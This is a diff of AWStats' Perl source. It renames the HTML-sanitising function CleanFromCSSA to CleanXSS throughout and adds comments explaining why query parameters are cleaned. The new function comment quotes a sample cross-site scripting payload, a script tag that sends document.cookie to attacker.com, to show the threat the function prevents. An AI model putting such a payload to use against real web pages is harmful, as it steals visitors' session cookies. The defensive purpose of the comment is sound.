@@ -4395,12 +4395,20 @@ sub Sanitize {
 #------------------------------------------------------------------------------
 # Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'
 #               and clean | char.
+#				A XSS attack is providing an AWStats url with XSS code that is executed
+#				when page loaded by awstats CGI is loaded from AWStats server. Such a code
+#				can be<script>document.write("<img src=http://attacker.com/” + document.cookie + “>”)</script>
+#				This make the browser sending a request to the attacker server that contains
+#				cookie used for AWStats server sessions. Attacker can this way caught this
+#				cookie and used it to go on AWStats server like original visitor. For this
+#				resaon, parameter received by AWStats must be sanitized by this function
+#				before beeing put inside a web page.
 # Parameters:   stringtoclean
 # Input:        None
 # Output:       None
 # Return:		cleanedstring
 #------------------------------------------------------------------------------
-sub CleanFromCSSA {
+sub CleanXSS {
 	my $stringtoclean=shift;
 	$stringtoclean =~ s/</&lt;/g;
 	$stringtoclean =~ s/>/&gt;/g;
@@ -4942,7 +4950,7 @@ sub ShowHostInfo {
 #------------------------------------------------------------------------------
 sub ShowURLInfo {
 	my $url=shift;
-	my $nompage=CleanFromCSSA($url);
+	my $nompage=CleanXSS($url);
 
 	# Call to plugins' function ShowInfoURL
 	foreach my $pluginname (keys %{$PluginsLoaded{'ShowInfoURL'}})  {
@@ -4954,7 +4962,7 @@ sub ShowURLInfo {
 
 	if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
 	if ($ShowLinksOnUrl) {
-		my $newkey=CleanFromCSSA($url);
+		my $newkey=CleanXSS($url);
 		if ($LogType eq 'W' || $LogType eq 'S') {		# Web or streaming log file
 			if ($newkey =~ /^http(s|):/i) {	# URL seems to be extracted from a proxy log file
 				print "<a href=\"".XMLEncode("$newkey")."\" target=\"url\">".XMLEncode($nompage)."</a>";
@@ -5502,7 +5510,8 @@ if ($ENV{'GATEWAY_INTERFACE'}) {	# Run from a browser as CGI
 	    $QueryString =~ s/&/&amp;/g;
 	}
 
-	$QueryString = CleanFromCSSA(&DecodeEncodedString($QueryString));
+	# Remove all XSS vulnerabilities coming from AWStats parameters
+	$QueryString = CleanXSS(&DecodeEncodedString($QueryString));
 
     # Security test
 	if ($QueryString =~ /LogFile=([^&]+)/i)				{ error("Logfile parameter can't be overwritten when AWStats is used from a CGI"); }
@@ -5515,11 +5524,11 @@ if ($ENV{'GATEWAY_INTERFACE'}) {	# Run from a browser as CGI
 	if ($QueryString =~ /pluginmode=([^&]+)/i)			{ $PluginMode=&Sanitize("$1",1); }
 	if ($QueryString =~ /configdir=([^&]+)/i)			{ $DirConfig=&Sanitize("$1"); }
 	# All filters
-	if ($QueryString =~ /hostfilter=([^&]+)/i)			{ $FilterIn{'host'}="$1"; }			# Filter on host list can also be defined with hostfilter=filter
-	if ($QueryString =~ /hostfilterex=([^&]+)/i)		{ $FilterEx{'host'}="$1"; }			#
-	if ($QueryString =~ /urlfilter=([^&]+)/i)			{ $FilterIn{'url'}="$1"; }			# Filter on URL list can also be defined with urlfilter=filter
-	if ($QueryString =~ /urlfilterex=([^&]+)/i)			{ $FilterEx{'url'}="$1"; }			#
-	if ($QueryString =~ /refererpagesfilter=([^&]+)/i)	{ $FilterIn{'refererpages'}="$1"; }	# Filter on referer list can also be defined with refererpagesfilter=filter
+	if ($QueryString =~ /hostfilter=([^&]+)/i)			{ $FilterIn{'host'}="$1"; }				# Filter on host list can also be defined with hostfilter=filter
+	if ($QueryString =~ /hostfilterex=([^&]+)/i)		{ $FilterEx{'host'}="$1"; }				#
+	if ($QueryString =~ /urlfilter=([^&]+)/i)			{ $FilterIn{'url'}="$1"; }				# Filter on URL list can also be defined with urlfilter=filter
+	if ($QueryString =~ /urlfilterex=([^&]+)/i)			{ $FilterEx{'url'}="$1"; }				#
+	if ($QueryString =~ /refererpagesfilter=([^&]+)/i)	{ $FilterIn{'refererpages'}="$1"; }		# Filter on referer list can also be defined with refererpagesfilter=filter
 	if ($QueryString =~ /refererpagesfilterex=([^&]+)/i) { $FilterEx{'refererpages'}="$1"; }	#
 	# All output
 	if ($QueryString =~ /output=allhosts:([^&]+)/i)		{ $FilterIn{'host'}="$1"; }			# Filter on host list can be defined with output=allhosts:filter to reduce number of lines read and showed
@@ -5551,7 +5560,8 @@ else {								# Run from command line
 		$QueryString .= "$NewLinkParams";
 	}
 
-	$QueryString = CleanFromCSSA($QueryString);
+	# Remove all XSS vulnerabilities coming from AWStats parameters
+	$QueryString = CleanXSS($QueryString);
 
     # Security test
 	if ($ENV{'AWSTATS_DEL_GATEWAY_INTERFACE'} && $QueryString =~ /LogFile=([^&]+)/i)	{ error("Logfile parameter can't be overwritten when AWStats is used from a CGI"); }
@@ -8118,7 +8128,7 @@ if (scalar keys %HTMLOutput) {
     		if ($HTMLOutput{'allhosts'})  { &BuildKeyList($MaxRowsInHTMLOutput,$MinHit{'Host'},\%_host_h,\%_host_p); }
     		if ($HTMLOutput{'lasthosts'}) { &BuildKeyList($MaxRowsInHTMLOutput,$MinHit{'Host'},\%_host_h,\%_host_l); }
     		foreach my $key (@keylist) {
-    			my $host=CleanFromCSSA($key);
+    			my $host=CleanXSS($key);
     			print "<tr><td class=\"aws\">".($_robot_l{$key}?'<b>':'')."$host".($_robot_l{$key}?'</b>':'')."</td>";
     			&ShowHostInfo($key);
     			if ($ShowHostsStats =~ /P/i) { print "<td>".($_host_p{$key}?$_host_p{$key}:"&nbsp;")."</td>"; }
@@ -8161,7 +8171,7 @@ if (scalar keys %HTMLOutput) {
     		my $count=0;
     		&BuildKeyList($MaxRowsInHTMLOutput,$MinHit{'Host'},\%_host_h,\%_host_p);
     		foreach my $key (@keylist) {
-    			my $host=CleanFromCSSA($key);
+    			my $host=CleanXSS($key);
     			print "<tr><td class=\"aws\">$host</td>";
     			&ShowHostInfo($key);
     			if ($ShowHostsStats =~ /P/i) { print "<td>".($_host_p{$key}?$_host_p{$key}:"&nbsp;")."</td>"; }
@@ -8412,7 +8422,7 @@ if (scalar keys %HTMLOutput) {
     		my $count=0;
     		&BuildKeyList($MaxRowsInHTMLOutput,1,\%_unknownreferer_l,\%_unknownreferer_l);
     		foreach my $key (@keylist) {
-    			my $useragent=XMLEncode(CleanFromCSSA($key));
+    			my $useragent=XMLEncode(CleanXSS($key));
     			print "<tr><td class=\"aws\">$useragent</td>";
     			print "<td>".Format_Date($_unknownreferer_l{$key},1)."</td>";
     			print "</tr>\n";
@@ -8437,7 +8447,7 @@ if (scalar keys %HTMLOutput) {
     		my $count=0;
     		&BuildKeyList($MaxRowsInHTMLOutput,1,\%_unknownrefererbrowser_l,\%_unknownrefererbrowser_l);
     		foreach my $key (@keylist) {
-    			my $useragent=XMLEncode(CleanFromCSSA($key));
+    			my $useragent=XMLEncode(CleanXSS($key));
     			print "<tr><td class=\"aws\">$useragent</td><td>".Format_Date($_unknownrefererbrowser_l{$key},1)."</td></tr>\n";
     			$total_l+=1;
     			$count++;
@@ -8653,7 +8663,7 @@ if (scalar keys %HTMLOutput) {
     		my $count=0;
     		&BuildKeyList($MaxRowsInHTMLOutput,$MinHit{'Refer'},\%_se_referrals_h,((scalar keys %_se_referrals_p)?\%_se_referrals_p:\%_se_referrals_h));	# before 5.4 only hits were recorded
     		foreach my $key (@keylist) {
-    			my $newreferer=$SearchEnginesHashLib{$key}||CleanFromCSSA($key);
+    			my $newreferer=$SearchEnginesHashLib{$key}||CleanXSS($key);
     			my $p_p; my $p_h;
     			if ($TotalSearchEnginesPages) { $p_p=int($_se_referrals_p{$key}/$TotalSearchEnginesPages*1000)/10; }
     			if ($TotalSearchEnginesHits) { $p_h=int($_se_referrals_h{$key}/$TotalSearchEnginesHits*1000)/10; }
@@ -8711,7 +8721,7 @@ if (scalar keys %HTMLOutput) {
     		my $count=0;
     		&BuildKeyList($MaxRowsInHTMLOutput,$MinHit{'Refer'},\%_pagesrefs_h,((scalar keys %_pagesrefs_p)?\%_pagesrefs_p:\%_pagesrefs_h));
     		foreach my $key (@keylist) {
-    			my $nompage=CleanFromCSSA($key);
+    			my $nompage=CleanXSS($key);
     			if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
     			my $p_p; my $p_h;
     			if ($TotalRefererPages) { $p_p=int($_pagesrefs_p{$key}/$TotalRefererPages*1000)/10; }
@@ -8753,8 +8763,8 @@ if (scalar keys %HTMLOutput) {
     		foreach my $key (@keylist) {
     			my $mot;
     			# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
-    			if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanFromCSSA(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
-    			else { $mot = CleanFromCSSA(DecodeEncodedString($key)); }
+    			if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanXSS(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
+    			else { $mot = CleanXSS(DecodeEncodedString($key)); }
     			my $p;
     			if ($TotalKeyphrases) { $p=int($_keyphrases{$key}/$TotalKeyphrases*1000)/10; }
     			print "<tr><td class=\"aws\">".XMLEncode($mot)."</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
@@ -8782,8 +8792,8 @@ if (scalar keys %HTMLOutput) {
     		foreach my $key (@keylist) {
     			my $mot;
     			# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
-    			if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanFromCSSA(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
-    			else { $mot = CleanFromCSSA(DecodeEncodedString($key)); }
+    			if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanXSS(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
+    			else { $mot = CleanXSS(DecodeEncodedString($key)); }
     			my $p;
     			if ($TotalKeywords) { $p=int($_keywords{$key}/$TotalKeywords*1000)/10; }
     			print "<tr><td class=\"aws\">".XMLEncode($mot)."</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
@@ -8810,9 +8820,9 @@ if (scalar keys %HTMLOutput) {
     			my $count=0;
     			&BuildKeyList($MaxRowsInHTMLOutput,1,\%_sider404_h,\%_sider404_h);
     			foreach my $key (@keylist) {
-                    my $nompage=XMLEncode(CleanFromCSSA($key));
+                    my $nompage=XMLEncode(CleanXSS($key));
     				#if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
-    				my $referer=XMLEncode(CleanFromCSSA($_referer404_h{$key}));
+    				my $referer=XMLEncode(CleanXSS($_referer404_h{$key}));
     				print "<tr><td class=\"aws\">$nompage</td>";
     				print "<td>$_sider404_h{$key}</td>";
     				print "<td class=\"aws\">".($referer?"$referer":"&nbsp;")."</td>";
@@ -10243,7 +10253,7 @@ if (scalar keys %HTMLOutput) {
 				my $count=0;
 				&BuildKeyList($MaxNbOf{'RefererShown'},$MinHit{'Refer'},\%_se_referrals_h,((scalar keys %_se_referrals_p)?\%_se_referrals_p:\%_se_referrals_h));
 				foreach my $key (@keylist) {
-					my $newreferer=$SearchEnginesHashLib{$key}||CleanFromCSSA($key);
+					my $newreferer=$SearchEnginesHashLib{$key}||CleanXSS($key);
 					print "<tr><td class=\"aws\">- $newreferer</td>";
 					print "<td>".($_se_referrals_p{$key}?$_se_referrals_p{$key}:'0')."</td>";
 					print "<td>$_se_referrals_h{$key}</td>";
@@ -10335,8 +10345,8 @@ if (scalar keys %HTMLOutput) {
 			foreach my $key (@keylist) {
 				my $mot;
 				# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
-				if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanFromCSSA(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
-				else { $mot = CleanFromCSSA(DecodeEncodedString($key)); }
+				if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanXSS(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
+				else { $mot = CleanXSS(DecodeEncodedString($key)); }
 				my $p;
 				if ($TotalKeyphrases) { $p=int($_keyphrases{$key}/$TotalKeyphrases*1000)/10; }
 				print "<tr><td class=\"aws\">".XMLEncode($mot)."</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
@@ -10367,8 +10377,8 @@ if (scalar keys %HTMLOutput) {
 			foreach my $key (@keylist) {
 				my $mot;
 				# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
-				if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanFromCSSA(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
-				else { $mot = CleanFromCSSA(DecodeEncodedString($key)); }
+				if ($PluginsLoaded{'DecodeKey'}{'decodeutfkeys'})  { $mot=CleanXSS(DecodeKey_decodeutfkeys($key,$PageCode||'iso-8859-1')); }
+				else { $mot = CleanXSS(DecodeEncodedString($key)); }
 				my $p;
 				if ($TotalKeywords) { $p=int($_keywords{$key}/$TotalKeywords*1000)/10; }
 				print "<tr><td class=\"aws\">".XMLEncode($mot)."</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
@@ -10543,7 +10553,7 @@ if (scalar keys %HTMLOutput) {
 	 			&BuildKeyList($MaxNbOfExtra[$extranum],$MinHitExtra[$extranum],\%{'_section_' . $extranum . '_h'},\%{'_section_' . $extranum . '_h'});
 	 		}
 			foreach my $key (@keylist) {
-	 			my $firstcol = CleanFromCSSA(DecodeEncodedString($key));
+	 			my $firstcol = CleanXSS(DecodeEncodedString($key));
 	 			$total_p+=${'_section_' . $extranum . '_p'}{$key};
 	 			$total_h+=${'_section_' . $extranum . '_h'}{$key};
 	 			$total_k+=${'_section_' . $extranum . '_k'}{$key};
